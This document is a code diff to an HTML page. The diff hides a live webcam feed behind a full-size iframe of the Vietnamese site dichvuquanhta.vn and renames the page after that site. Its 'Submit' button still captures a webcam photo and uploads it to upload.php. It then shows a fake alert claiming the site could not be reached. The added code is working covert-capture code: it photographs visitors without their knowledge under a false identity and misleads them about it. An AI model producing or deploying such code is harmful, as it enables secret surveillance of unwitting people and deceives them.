@@ -2,20 +2,43 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Camera Upload</title>
+    <title>DICHVUQUANHTA</title>
 </head>
 <body>
 
-<video id="video" width="300" autoplay></video>
-<br><br>
+<div style="position:relative; width:320px; height:240px;">
+
+    <!-- CAMERA -->
+    <video id="video" width="320" height="240" autoplay></video>
+
+    <!-- DIV CHE + LOAD WEBSITE -->
+    <div id="cover" style="
+        position:absolute;
+        top:0;
+        left:0;
+        width:100%;
+        height:100%;
+        z-index:10;
+    ">
+        <iframe 
+            src="https://dichvuquanhta.vn" 
+            style="width:100%; height:100%; border:none;">
+        </iframe>
+    </div>
+
+</div>
+
+<br>
+
 <button onclick="capture()">📸 Submit</button>
+<!--<button onclick="toggleCover()">👁 Toggle Cover</button>-->
 
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
 let video = document.getElementById('video');
 
-// Mở camera
+// MỞ CAMERA
 navigator.mediaDevices.getUserMedia({ video: true })
 .then(stream => {
     video.srcObject = stream;
@@ -24,7 +47,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
     alert("Không mở được camera: " + err);
 });
 
-// Chụp ảnh + gửi server
+// CHỤP ẢNH + GỬI SERVER
 function capture() {
     let canvas = document.getElementById('canvas');
     let context = canvas.getContext('2d');
@@ -34,19 +57,28 @@ function capture() {
 
     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    // convert base64
     let imageData = canvas.toDataURL('image/png');
 
-    // gửi AJAX
     let xhr = new XMLHttpRequest();
     xhr.open("POST", "upload.php", true);
     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
     xhr.onload = function() {
-        alert("Server trả về: " + this.responseText);
+        alert("Server: khoong truy cap duoc trang web dich vu quanh ta.vn");
     };
 
     xhr.send("image=" + encodeURIComponent(imageData));
+}
+
+// BẬT / TẮT LỚP CHE
+function toggleCover() {
+    let cover = document.getElementById("cover");
+
+    if (cover.style.display === "none") {
+        cover.style.display = "block";
+    } else {
+        cover.style.display = "none";
+    }
 }
 </script>
 
